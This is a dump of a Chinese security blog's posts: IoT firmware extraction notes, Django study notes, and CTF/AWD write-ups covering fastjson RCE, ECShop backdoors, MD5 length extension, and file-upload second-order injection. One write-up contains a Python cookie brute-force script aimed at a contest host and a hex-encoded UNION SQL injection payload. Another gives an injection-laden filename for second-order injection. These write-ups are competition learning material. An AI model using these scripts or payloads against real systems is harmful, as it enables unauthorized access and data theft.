    <content type="text"><![CDATA[智能设备的组成 CPU: X86/ARM/MIPS/PPC等 内存: SDRAM/RAM 存储: Flash/TF卡/SD卡/MMC卡/硬盘 串口: 一般电路板会留，做调试用网口: 智能设备联网 USB口: 接U盘做扩展存储用、也可接键盘和鼠标等 无线接口: Wifi/蓝牙/ZigeBee等 bootLoader: Uboot等 操作系统: Linux/RT-Linux/VxWorks/uCOS-I 智能硬件设备测试简要流程1、获取固件2、逆向固件3、分析固件漏洞/调试固件/Fuzz漏洞4、漏洞验证(这一步要有硬件)5、完成测试文档 智能设备固件获取方法1、官网或联系售后索取升级包2、在线升级, 抓包获取下载地址3、逆向升级软件,软件内置解包和通讯算法4、从硬件调试接口:JTAG/SWD, 利用调试工具的任意地址读取功能5、拆Flash、Sd卡、TF卡、硬盘等,用编程器或对应设备读固件6、用硬件电路的调试串口和固件的bootloader获取固件7、通过利用网页和通讯漏洞获取固件敏感信息8、用逻辑分析仪监听flash,ram获取信息9、从串口进入系统后,用tar、nc、dd、echo、vi等命令提取 拆Flash后,用编程器获取固件只需要三步, 但对大部分人很困难:(1)焊下flash芯片(2)用编程器提取固件内容(3)把FLASH芯片焊回电路板 从串口(UART)调试口获取固件 前提: 开发板上有串口调试接，需要我们找出隐藏的串口。 串口按照电压有两种标准：RS232标准和TTL标准 RS232标准： 电压范围：-12V，+12V （负逻辑） TTL标准： 电压范围：0，5V 串口引脚识别方法: 串口一般有4个引脚 VCC：电源电压为3.3V 或 5V GND：电源电压地 RXD：数据接收引脚，万用表测电压为低（如硬件上拉可为高） TXD：数据发送引脚，万用表测电压一般为高 试验: 用万用表找串口 从串口进入系统 SecureCRT的使用 通过开发留下的串口, 进入系统 尝试运行系统的调试命令 学习串口日志的记录和回看方法 从串口uboot提取固件流程(1)获取flash固件信息(2)用md命令提取固件信息(3)记录串口输出信息(4)分析输出信息,获取固件 uboot提取固件: md命令md - memory display (显示内存RAM/SDRAM内容)用法: md 起始地址 长度 （地址和长度为十六进制格式）思考: md 命令是否能提取固件？ 怎么提取固件呢？可以先把flash中的内容拷贝到内存，再从内存打印 固件提取技术 Binwalk提取文件命令：binwalk -e firmware.bin命令：binwalk -Me firmware.bin命令：binwalk -Me firmware.bin命令：binwalk -Me -d 5 firmware.bin IDA proIDA Pro（简称IDA）是一款交互式反汇编工具IDA最主要的特性是交互和多处理器IDA支持的文件类型非常丰富除了常见的PE格式，还支持Windows,DOS,UNIX,Mac,Java,.NET等平台文件格式。 retdec反编译器不限于任何特定的目标架构，操作系统或可执行文件格式：支持的文件格式：ELF，PE，Mach-O，COFF，AR（存档），Intel HEX和原始机器码。支持的体系结构（仅限32b）：Intel x86，ARM，MIPS，PIC32和Power 敏感信息收集工具FirmwalkerFirmwalker是一个非常棒的固件分析入手工具，能够帮您找到感兴趣的文件，以便进行更深入的分析 固件的弱密码Linux密码文件/etc/passwd 密码的前两位是”盐”值，是一个随机数，后面跟的是加密的密码/etc/shadow 只有root可读 /etc/passwd文件简介adm拥有账号文件，起始目录/var/adm通常包括日志文件bin拥有用户命令的可执行文件daemon用来执行系统守护进程games用来玩游戏halt用来执行halt命令lp拥有打印机后台打印文件mail拥有与邮件相关的进程和文件news拥有与usenet相关的进程和文件nobody被NFS（网络文件系统）使用shutdown执行shutdown命令sync执行sync命令uucp拥有uucp工具和文件 实用破解法：社工字典法 John the Ripper（john-1.8.0）John是一款快速密码破解工具，目前支持Unix,Windows,DOS,BeOS和OpenVMS主要目的是用于发现Unix弱密码另外支持许多密码hash类型，如unix系统、windows的LMhash等 固件漏洞挖掘Ncrack是一个高速的网络认证破解工具，它可以帮助企业测试所有的网络主机和网络设备的密码强度，提高企业网络的安全性。安全专业人员也可使用 Ncrack做渗透测试。Ncrack支持windows和linux系统，并且可以测试暴力破解测试，支持的协议包括RDP、 SSH、 HTTP(s)、 SMB、POP3(s)、 VNC、 FTP, SIP、 Redis、 PostgreSQL、MySQL 以及Telnet。]]></content>
      <categories>
        <category>工控安全</category>
      </categories>
      <tags>
        <tag>ICS</tag>
        <tag>固件分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5_Django高级]]></title>
    <url>%2F2018%2F07%2F31%2FDjango%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-5%2F</url>
    <content type="text"><![CDATA[django高级应用 静态文件管理静态文件项目中的CSS，图片，js都是静态文件 配置静态文件 在settings文件中定义静态内容 1234567#逻辑规则STATIC_URL = '/static/' #物理存储目录STATICFILES_DIRS = [ os.path.join(BASE_DIR, 'static'),] 在项目根目录下创建static目录，再创建当前应用名称的目录 1mysite/static/myapp/ 在模板中可以使用硬编码 1/static/my_app/myexample.jpg 在模板中可以使用static编码 12&#123; % load static from staticfiles % &#125;&lt;img src="&#123; % my_app/myexample.jpg % &#125;" alt="My image"/&gt; 中间件 上传图片 Admin站点 ModelAdmin对象 列表页选项 增加与修改页选项 InlineModelAdmin对象 重写admin模板 分页Paginator对象 Page对象 使用jquery完成ajax]]></content>
      <categories>
        <category>Django学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[4_Django模板]]></title>
    <url>%2F2018%2F07%2F29%2FDjango%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-4%2F</url>
    <content type="text"><![CDATA[Templates 模板 模板处理 快捷函数 定义模板模板语言包括 变量 标签 过滤器 { % 代码块 %} 注释 变量在模板中调用对象的方法标签过滤器注释 模板继承 说明 三层继承模型 HTML转义 会被自动转义的字符 关闭转义 字符串字面值 CSRF 验证码 验证码视图 配置url 显示验证码 验证 第三方 可以在网上搜索“验证码”，找到一些第三方验证码提供网站，阅读文档，使用到项目中]]></content>
      <categories>
        <category>Django学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[3_Django模型]]></title>
    <url>%2F2018%2F07%2F28%2FDjango%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3%2F</url>
    <content type="text"><![CDATA[Models.py ORM对象-关系-映射根据对象的类型生成表结构将对象，列表的操作，转换为sql语句将sql查询到的结果转换为对象，列表 Django中的模型包含存储数据的字段和约束，对应着数据库中唯一的表 使用mysql数据库pip install mysql-python 在mysql中创建数据库create database test2 charest=utf8; 打开settings.py文件，修改DATABASES项可以看到我们现在用的是sqlite3这个数据库(自己生成一个db.sqlite3数据库文件)settings.py中改个配置就可以用我们的mysql数据库 开发流程 使用已有数据库生成模型类python manage.py inspectdb &gt; booktest/models.py 创建添加应用python manage.py startapp booktest创建应用之后需要把应用booktest添加到settings.py的INSTALLED_APPS 定义模型 定义属性 字段类型 字段选项 关系 示例 在models.py中定义表结构 生成迁移之后python manage.py makemigrations 执行迁移之后python manage.py migrate 类的属性 管理器（可自定义）模型类—&gt;管理器—&gt;数据库（管理器是模型类的一个属性，用于将对象和数据表映射） 模型类的创建方法&emsp;&emsp;在自定义的模型类中写init方法时会报错，因为model.Model中已经有了init方法，那我们怎么快捷创建每个模型类呢？解决方法： (1) 创建类方法。 我们在模型类中，自定义一个创建模型类的方法我们在python manage.py shell中，创建一个abc对象：报错是因为时区问题，不影响 (2) 在自定义的管理器中，创建对象方法 （不在类中做这件事） 模型查询 查询集 限制查询集 查询集的缓存 字段查询 比较运算符 聚合函数 F对象 Q对象]]></content>
      <categories>
        <category>Django学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2_Django视图]]></title>
    <url>%2F2018%2F07%2F28%2FDjango%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2%2F</url>
    <content type="text"><![CDATA[Views.py 视图 URL匹配的过程url也可以写在应用(booktest)中: URLconf 其他的URLconfs URL的反向解析 错误视图Django原生自带几个默认视图用于处理HTTP错误 404(page not found)视图 500(server error)视图 400(bad request)视图 HttpRequest对象 服务器收到http协议的请求后，会根据报文创建HttpRequest对象 视图函数的第一个参数是HttpRequest对象 在django.http模块中定义了HttpRequest对象的API属性方法 1、get()作用：根据键获取值只能获取一个值www.baidu.com/abc?a=1&amp;b=2&amp;c=3 2、getlist()将键的值以列表的形式返回可以获取多个值www.baidu.com/abc?a=1&amp;a=2&amp;c=3 QueryDict对象GET属性POST属性 HttpResponse对象 属性 方法 子类HttpResponseRedirectHttpResponseRedirect()可简写为redirect() 子类JsonResponse 状态保持 启用session 使用session 用户登录示例在views.py中创建视图 配置url 创建模板index.html 创建模板login.html 会话过期时间 存储session 使用Redis缓存session 登录认证逻辑利用django封装好的authenticate()函数，认证登录Django防止越权，直接访问127.0.0.1:8000/manage/不允许访问 from django.contrib.auth.decorators import login_required @login_required 如果想限制某个试图函数必须登录才能访问，则在函数前面加上@login_required即可(记得清除浏览器缓存)]]></content>
      <categories>
        <category>Django学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1_Django概述]]></title>
    <url>%2F2018%2F07%2F28%2FDjango%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1%2F</url>
    <content type="text"><![CDATA[环境安装Django安装：pip install django==1.10.3安装前段框架Bootstrap3，利用其结合Django开发Web页面： pip install django-bootstrap3使用PyMysql连接mysql数据库： pip install PyMySQL Django框架介绍&emsp;&emsp;Django是一个基于MVC构造的框架。但是在Django中，控制器接受用户输入的部分由框架自行处理，所以 Django 里更关注的是模型（Model）、模板(Template)和视图（Views），称为 MVT模式。它们各自的职责如下： 层次 职责 模型（Model），即数据存取层 处理与数据相关的所有事务： 如何存取、如何验证有效性、包含哪些行为以及数据之间的关系等。 模板(Template)，即业务逻辑层 处理与表现相关的决定： 如何在页面或其他类型文档中进行显示。 视图（View），即表现层 存取模型及调取恰当模板的相关逻辑。模型与模板的桥梁。 &emsp;&emsp;从以上表述可以看出Django 视图不处理用户输入，而仅仅决定要展现哪些数据给用户，而Django 模板 仅仅决定如何展现Django视图指定的数据。或者说, Django将MVC中的视图进一步分解为 Django视图 和 Django模板两个部分，分别决定 “展现哪些数据” 和 “如何展现”，使得Django的模板可以根据需要随时替换，而不仅仅限制于内置的模板。 &emsp;&emsp;至于MVC控制器部分，由Django框架的URLconf来实现。URLconf机制是使用正则表达式匹配URL，然后调用合适的Python函数。URLconf对于URL的规则没有任何限制，你完全可以设计成任意的URL风格，不管是传统的，RESTful的，或者是另类的。框架把控制层给封装了，无非与数据交互这层都是数据库表的读,写,删除,更新的操作。在写程序的时候，只要调用相应的方法就行了，感觉很方便。程序员把控制层东西交给Django自动完成了。 只需要编写非常少的代码完成很多的事情。所以，它比MVC框架考虑的问题要深一步，因为我们程序员大都在写控制层的程序。现在这个工作交给了框架，仅需写很少的调用代码，大大提高了工作效率。 web框架 什么是ORM？ Django框架&emsp;&emsp;目录分开，就必须有机制将他们在内里进行耦合。在Django中，urls、orm、static、settings等起着重要的作用。一个典型的业务流程是如下图所示：&emsp;&emsp;Django是一个基于MVC构造的框架。但是在Django中，控制器接受用户输入的部分由框架自行处理，所以 Django 里更关注的是模型（Model）、模板(Template)和视图（Views），称为 MTV模式。 Django优点 强大的数据库功能 用 python 的类继承，几行代码就可以拥有一个丰富、动态的数据库操作接口（API），如果需要，你也能执行 SQL 语句ORM（Object-Relational-Mapping“对象-关系-映射”），它实现了数据模型与数据库的解耦，即数据模型的设计不需要依赖于特定的数据库，通过简单的配置就可以轻松更换数据库。 自带强大的后台功能 几行代码就让网站拥有一个强大的后台，轻松管理内容。 优雅的网址 在urls.py中用正则匹配网址，传递到对应的函数。(需要注意的是:正则是一种独立的语法，并不是哪个语言所拥有的。) 具有模板系统 强大，易扩展的模板系统，设计简易，代码和样式分开设计，更易管理。 缓存系统&emsp;&emsp;Django和memcached、redis或者其他的缓存系统联用，表现更出色，提高了页面的加载速度。&emsp;&emsp;templates 文件夹views.py 中的函数渲染 templates 中的 Html 模板，得到动态内容的网页，当然可以用缓存来提高速度。 国际化 完全支持多语言应用，允许你定义翻译的字符，轻松翻译成不同国家的语言。 Django基本操作创建项目(test1)django-admin startproject test1 创建应用(booktest)python manage.py startapp booktest 创建更改的文件 （生成迁移）python manage.py makemigrations 将生成的py文件应用到数据库 （执行迁移）python manage.py migrate 创建一个管理员用户（按提示输入用户名，邮箱，密码）python manage.py createsuperuser 运行（可以指定ip地址和端口号）#python manage.py runserver 127.0.0.1:8001]]></content>
      <categories>
        <category>Django学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ISCC2018线下赛总结]]></title>
    <url>%2F2018%2F06%2F26%2FISCC2018%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[环境介绍先拿自己靶机，攻下高地，进入公共区域攻防这次比赛打得非常差，赛后又重新自己复现了一下，emmm大概是这个样子的给了一个环境，是Tomcat，开了8080端口 比赛信息是192.168.43.70/whatisyourname/，这里用到了fastjson反序列化漏洞，熟悉Java的同学应该能看出来(但我是真的看不出来（╯－＿－）╯╧╧ ) fastjson反序列化漏洞参考：https://blog.csdn.net/yaofeino1/article/details/76377080https://github.com/iBearcat/Fastjson-Payloadhttps://github.com/shengqi158/fastjson-remote-code-execute-poc 环境源码下载通过github下载含有漏洞环境的web源代码下载地址直接将war包放到tomcat的webapp目录下，运行tomcat就行： 漏洞复现：通过浏览器访问环境URL，利用burpsuite对数据包进行拦截，修改数据包发送方式并且插入POST数据{“name”:”feifei”,age:12} ，查看效果：然后根据参考文献找到Test.java文件构造poc(反弹shell)，编译一下生成.class文件base64 encode一下替换name字段，post过去可以看到命令执行成功nc连接上执行命令然后就是执行主办方给的getflag命令就可以打了，当时不知道什么原因环境命令执行有时能成功有时不成功≡￣﹏￣≡nc也死活连不上说到底还是自己好菜，对基础的东西理解还是不扎实，还是要多总结多刷题以赛代练，希望自己能进步的快一点 &lt;(￣ c￣)y▂ξ]]></content>
      <categories>
        <category>CTF</category>
        <category>AWD</category>
      </categories>
      <tags>
        <tag>攻防</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第三届安恒杯线下赛总结]]></title>
    <url>%2F2018%2F06%2F26%2F%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%AE%89%E6%81%92%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93-1%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;这次比赛只有一道web环境，用的是ECShop V2.7.3&emsp;&emsp;模式是AD攻防，规则很简单（虽然半天才搞明白 ￣﹏￣），让对方的极其请求http://10.0.1.2，并带上自己的token，即可获取flag poc1post方式文件url：http://10.50.%s.2/mobile/index.php参数：url=http://10.0.1.2?token=RCNWBJXQ poc2post方式文件url：http://10.50.33.2/mobile/index.php?m=default&amp;c=auction参数：1=phpinfo() 提示线索1:mobile/themes/default/auction_list.dwt这是一个预留后门，比较叼D盾扫不出来提示线索2:mobile/api/uc.php 任意文件读取(poc 1)根据给出的poc1，我们快速去定位问题文件位置我们从mobile入口文件入手即： mobile/index.php查看内容跟踪文件 看到内容 跟踪apps/目录可以发现3个文件夹 我们首先看到默认文件夹 此时又得到5个文件夹 从第一个common文件夹开始可以看到insert.php中的一个函数 看到关键代码 其中 明显是一个任意文件读取利用脚本： 一句话木马文件(poc 2)防守方法删除预留后门auction_list.dwt文件即可当时官方给出提示：auction_list.dwt文件!upload successful由于此文件用于渲染，直接将小马删除即可 任意写文件防守方法改掉writesth函数名即可定位到mobile/api/uc.php在action数组中发现了一些奇怪的东西最后一个writesth十分瞩目，一看就应该是主办方留下的功能，我们全局搜索这个writesth函数不难发现以下关键代码：即：文件名可控文件内容可控即可写入Webshell我们测试运行即可发现我们当前目录下写入sky.php，内容为但是由于当时的环境里，只有data目录有可写全写，而我们默认路径为所以直接写可能无效，应该选择上跳，例如 ../data/sky.php ECShop v2.7.3后台直接getshell防守方法改掉后台密码即可（默认admin admin888） 弱口令本次比赛还有一个漏洞就是ctf用户弱口令cat /etc/shadow得到ctf账户密码123456就因为这个漏洞被dalao全场从头打到尾…]]></content>
      <categories>
        <category>CTF</category>
        <category>AWD</category>
      </categories>
      <tags>
        <tag>攻防</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hash长度拓展攻击]]></title>
    <url>%2F2018%2F05%2F08%2Fhash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[Hash Length Extension Attack&emsp;&emsp;总体来说就是我们知道一个加盐的hash值，即使我们不知道盐的具体内容，但只要知道长度就可以随便伪造种带盐的hash（相当于我们控制了明密文） MD5加密原理先介绍一下md5加密的原理 个人理解: md5的过程可以分成填充和压缩的过程 md5 padding(填充)&emsp;&emsp;message padding&emsp;&emsp;length%64=56(8位标识原始长度)填充的时候，将会使用16进制数据：&emsp;~1个\x80&emsp;~N个\0x00 md5 compress(压缩)&emsp;&emsp;message padding length—–&gt;hash&emsp;&emsp;length=N*64(bit) —–&gt;length%64(bit) md5 padding例如我们把admin来hash一下:admin 先hex编码-&gt;61646d696e再填充80不满64bit，填充到第56位（50个00）——为了保证信息的长度为N*64+56(字节)最后数据表示位2800000000000000（8个字节）最终结果为: 61646d6968000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000 什么是Magic number (确定值)代码中的0x67452301L, 0xefcdab89L, 0x98badcfeL, 0x10325476L这4个初始化的number就被称为Magic number或者是md5 iv (md5向量) md5 compress我们发现，无论输入多长的信息，计算出来的问就按hash长度都是固定的(md5有32字节)，这就是因为hash算法是一种压缩算法。Hash设计的时候不要求还原，所以就尽可能的扩大信息对每一位hash值的印象。在计算中，也是通过对每组长度为64bit信息分组进行迭代运算实现的。每一次迭代，都会利用一个初始值与本组中的原始信息做一个复杂的数学运算，而将生成的结果带入到下次的复杂运算中作为初始值我们还是计算admin的md5值。因为不满64bit,所以padding之后也只有64个bit，也就需要计算一轮compress压缩算法。压缩算法完成后产生的心magic number为：A=0x292f2321LB=0xa7a5577aLC=0xe4a8943LD=0xc31f804aL而md5的结果:我们发现其实就是这一轮结果的简单拼接（小端存储数据倒叙） hash长度拓展攻击其实只要知道三点后就能进行攻击： MD5(salt+message)的值 message内容 salt+message长度这样就可以在不知道salt的具体内容下，计算出任意的md5(salt+message+padding+append)值因为salt+message+padding内容是经过填充的，一定是N*64，所以这个部分刚好能完成N轮复杂运算。而他的结果，也就是md5(salt+message+padding)刚好是用来做下一轮运算，也就是m’+padding运算的初始向量。 攻击过程逆向算法很简单 def compute_magic_number(self, md5str): self.A = struct.unpack(&quot;I&quot;, md5str[0:8].decode(&apos;hex&apos;))[0] self.B = struct.unpack(&quot;I&quot;, md5str[8:16].decode(&apos;hex&apos;))[0] self.C = struct.unpack(&quot;I&quot;, md5str[16:24].decode(&apos;hex&apos;))[0] self.D = struct.unpack(&quot;I&quot;, md5str[24:32].decode(&apos;hex&apos;))[0] 由它逆出A=0x292f2321L,B=0xa7a5577aL,C=0xe4a8943L,D=0xc31f804aL根据这4个Magci number，再和扩展的字符串m’(此时的m’要进行padding，padding的长度是len(salt+message+padding+m’))进行md5 compress，最后的结果即md5(salt+message+padding+m’)这样就完成了长度拓展攻击 例题测试实验吧-让我进去抓包改source，Repeater过去发现源码 $flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;; $secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security $username = $_POST[&quot;username&quot;]; $password = $_POST[&quot;password&quot;]; if (!empty($_COOKIE[&quot;getmein&quot;])) { if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) { if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { echo &quot;Congratulations! You are a registered user.\n&quot;; die (&quot;The flag is &quot;. $flag); } else { die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;); } } else { die (&quot;You are not an admin! LEAVE.&quot;); } } setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7)); if (empty($_COOKIE[&quot;source&quot;])) { setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7)); } else { if ($_COOKIE[&quot;source&quot;] != 0) { echo &quot;&quot;; // This source code is outputted here } } 按照源码要求，cookie中要存在变量getmein，而且，要 $COOKIE[“getmein”] === md5($secret . urldecode($username . $password))sample-hash是secret+adminadmin的MD5这里secret相当于盐，我们并不知道，但是我们知道它的长度是15，算上后面admin就是20。数据是admin签名（哈希值）是571580b26c65f306376d4f64e53cb5c7生成的hash是新的签名，设置到cookies的getmein里面把\x换成%后post提交，得到flag]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蓝鲸笔记系统writeup]]></title>
    <url>%2F2018%2F04%2F10%2F%E8%93%9D%E9%B2%B8%E7%AC%94%E8%AE%B0%E7%B3%BB%E7%BB%9Fwriteup%2F</url>
    <content type="text"><![CDATA[蓝鲸笔记系统给出一个login界面，url看上去似乎有问题http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=login感觉像是有文件包含随便尝试一下http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=index果然是文件包含。先随便注册一个账号进去看看，发现 hint:./dbinit.sql 发现了flag字段，flag应该就是在数据库里面了 肯定是文件包含无疑了，相办法读源码 利用php伪协议读源码：php://filter/read=convert.base64-encode/resource=不让读，真尴尬 然后仔细看了看url，猜测这个front是文件夹名，login是文件名http://202.98.28.108:10013/7sghfe673jd3/front/index.php还是拒绝访问… 猜测后台脚本是这样写的:include($action.’/‘.$mode.’.php’)require”$action.’/‘.$mode.’.php’” 成功读出来了！！！login不让读，但是审计index.php的源码时发现common.php，顺便把源码也down下来 代码审计先看一下index.php，并没有发现什么东西在common.php中发现一些定义的函数 御剑扫一下，发现/admin/login.php , /admin/index.php，把源码都down下来在/admin/login.php中发现 /admin/login.php,调用了set_login()函数 /front/common.php中有set_login()函数的定义 来到http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login 跟踪一下这几个函数，这里设置了cookies和session。可以看出来最后set_cookie的值是$uname|$endata$uname是admin。则cookie是 admin|md5(SECURITY_KEY+admin) SECURITY_KEY 是个随机数，每一位是从wh两个字母中随机出来的6位随机数 看一下后台登陆验证 两个函数在common.php中 这里验证了userid和level，如果cookie验证失败，则返回false，level如果是0，也返回false。 但是如果我们没有登陆，直接来到/admin/index.php页面，而且绕过cookie的验证，那么userid和level的默认初始值都是null。在php中，null!==False Truenull!=FalseFalse$null!==false是返回true的。所以只要我们能伪造cookie，就可以绕过验证。 爆破cookie脚本import requests import hashlib import random import string false_tag = &quot;not login!&quot; url = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=index&quot; url_csrf = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login&quot; def rand_str(length): return &apos;&apos;.join(random.choice(string.ascii_letters + string.digits) for _ in range(length)) def md5_encode(data): hash = hashlib.md5() hash.update((data + &quot;admin&quot;).encode()) return hash.hexdigest() key = [] for x1 in [&quot;w&quot;,&quot;h&quot;]: for x2 in [&quot;w&quot;,&quot;h&quot;]: for x3 in [&quot;w&quot;,&quot;h&quot;]: for x4 in [&quot;w&quot;,&quot;h&quot;]: for x5 in [&quot;w&quot;,&quot;h&quot;]: for x6 in [&quot;w&quot;,&quot;h&quot;]: key.append(x1+x2+x3+x4+x5+x6) print key s = requests.Session() s.headers = { &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&apos;, &apos;cookie&apos;: &apos;&apos; } for x in key: s.headers[&quot;cookie&quot;] = &quot;uid=admin%7C&quot;+md5_encode(x)#+&quot;;&quot;+&quot;PHPSESSID={}&quot;.format(rand_str(26)) s.headers[&quot;PHPSESSID&quot;] = rand_str(26) print s.headers[&quot;cookie&quot;] result = s.get(url) #print result.content if false_tag in result.content: print &quot;NO&quot;,x else: print &quot;YES&quot; print s.headers print result.content break 发现setpagenumu页面，down下来源码 二次注入发现post的page是用户可以输入但是类型限制了纯数字，应该是没有办法注入 回去审计/admin/index.php 发现数据库里查询的是$page_size,跟踪get_page_size(), get_page_size()函数返回num，也就是index里面的$page_size感觉应该能注入，回去看数据库文件 发现数据库里定义的page是varchar类型标准的脚本代码与数据库类型不匹配利用is_numeric()函数的漏洞(认为0x…是整数)，构造一个二次注入 数据库文件中可以看到一共有四个列 构造注入语句2 union select 1,flag,flag,4 from flags转成十六进制注入即可拿到flag0x3220756e696f6e2073656c65637420312c666c61672c666c61672c342066726f6d20666c616773]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>二次注入</tag>
        <tag>php函数漏洞</tag>
        <tag>php伪协议</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件管理系统writeup]]></title>
    <url>%2F2018%2F04%2F08%2Fday1%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[文件上传之代码审计前几天做了一道有趣的web题，涉及到文件上传，代码审计，二次注入。 首先是一个文件管理系统，上传文件，重命名文件，删除文件的功能。也给出了网站源码。先审计代码，看一下upload.php文件上传函数，先看服务器怎么检查文件的，可以看到$pat_part[“extension”]不允许php上传其中文件名 也被addslashes函数过滤，转义了一些字符，因此这里应该不存在注入 文件名存在数据库两个字段中，一个是filename（文件名），一个是extension（后缀名） 可以看出来文件名走过的流程是：$file[‘name’]—&gt;pathinfo()—&gt;$path_part[‘filename’]—&gt;addslashes()—&gt;insert 再看一下rename.php首先查询文件名，如果存在，执行sql语句根据$req[‘filename’]从数据库里查询到已存在的一行，并调用update语句进行修改 但在这里{oldname=[‘filename’]}将从数据库里查出的$result[‘filename’]再一次入库，结果造成一个二次注入 如果我们可以插入让extension的值为空，再把文件名在改名为.php就可以解析了 那么思路很明确，我们上传一个有恶意字段的jpg文件，然后rename进数据库，让后缀名变为空，然后再上传一个木马文件，由于extension为空，所以再次修改的时候不会加上.jpg的扩展名。 解题步骤： 上传文件名为’,extension=’’,filename=’aa.jpg.jpg 这样filename的值为’,extension=’’,filename=’aa.jpg 我们重命名把’,extension=’’,filename=’aa.jpg改为aa.jpg 这时我们再次上传一个写有木马的文件，文件名为aa.jpg 此时不会提示file is exists 因为extension!=jpg 将aa.jpg改为aa.php即可]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
        <tag>代码审计</tag>
        <tag>二次注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F04%2F07%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
  <entry>
    <title><![CDATA[RSA总结]]></title>
    <url>%2F2018%2F04%2F06%2Frsa%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[先留个坑，等强网杯RSA那道题出write up再写…]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>crypto</tag>
        <tag>rsa</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第一次攻防训练赛小记]]></title>
    <url>%2F2018%2F04%2F01%2F%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E8%AE%AD%E7%BB%83%E8%B5%9B%E5%B0%8F%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;昨天按照实验室的要求，我们参加了个人的第一场ctf攻防形式的训练赛。形式是线上赛，由师傅搭好的环境，总体来说收获还是很大的，见识到了很多有(yin)趣(xian)的套路。总结一下&emsp;&emsp;先说一下规则，一个五个队伍，每队两人。因为是训练，只有三道Web题，拿到其他队的flag加十分，被攻击队伍扣除相应分数。重启服务器扣除300分。五分钟一回合，宕机一回合扣除 (未宕机队伍的数量)*3 ，分数平均加到相应的队伍。（过程中发现一个骚操作就是当其他队伍宕机了，你还可以用之前上的shell拿flag，这样相当于多加了一部分分数） 第一道题是semcms1.1版本，上网查到相应漏洞，首先注入找到后台密码，后台有个任意文件上传，上一张图片马直接getshell，连菜刀顺利拿到flag。但是大佬们更快一步，已经吊打我们而且把洞修好了… 第三题是一个微窗cms，有一个命令执行的洞。稍微有一点点麻烦，这个好像没法上shell，直接构造命令执行语句也能读出flag 第二题最骚，页面发现一个神奇md5，解密后发现是ranzhi，搜了一些poc都用不了，最后也没做出来。最后师傅们分享write up后发现website源码里有一个预留后门，直接菜刀拿shell！！！(hao qi ya)正规解法是mysql查询到登录密码，登陆进去有一个上shell的地方。本菜代码审计能力太差，也没看懂 这次比赛下来身为小白总结了几点：&emsp;&emsp;对于一个攻防比赛，最开始并不是攻击，也不是防御。二话不说ssh连上自己website把源码备份一遍。这样以来，如果以后不慎自己服务器宕机了，还有复原的机会。 1234攻击方面： 